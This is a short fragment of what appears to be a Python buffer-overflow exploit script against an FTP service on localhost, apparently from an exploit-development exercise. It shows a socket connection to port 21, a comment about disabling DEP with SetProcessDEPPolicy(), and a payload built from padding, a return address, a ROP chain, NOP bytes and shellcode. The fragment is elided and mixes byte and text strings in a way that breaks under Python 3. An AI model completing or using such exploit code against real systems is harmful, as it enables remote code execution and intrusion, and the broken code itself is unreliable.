...
connect=s.connect(('localhost',21))
...
#Step 5: Exploit - DEP disable with SetProcessDEPPolicy()
...
buffer = b"A"*251 + ret + b"C"*8 + rop_chain +  b"\x90" * 4 + "\x90"*4 + shellcode
